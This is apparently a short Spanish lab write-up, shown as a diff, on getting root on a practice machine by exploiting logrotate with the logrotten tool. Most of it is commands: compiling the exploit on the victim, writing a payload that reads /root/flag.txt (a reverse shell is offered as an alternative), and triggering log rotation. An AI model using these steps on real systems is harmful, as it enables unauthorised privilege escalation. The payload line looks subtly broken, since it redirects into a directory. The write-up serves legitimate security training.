@@ -1,0 +1,12 @@
+Al conectarnos a la maquina con ssh vemos que hay una carpeta backups con access.log 
+Lo que tenemos que hacer es coger el lorotten.c de github, pasarlo a la maquina victima y compilarlo.
+Ahora creamos un payload, puedes poner una reverse shell o que te guarde la flag en tu directorio con 
+$ echo "cat /root/flag.txt > /home/htb-student/" > payload
+
+Ahora ejecutamos en segundo plano logrotten con:
+$ ./logrotten -p ./payload ./backups/access.log ; bg
+
+Y escribimos algo en el log:
+$ echo "algo" > backups/access.log
+
+Y se rotara el log y obtendremos la flag.
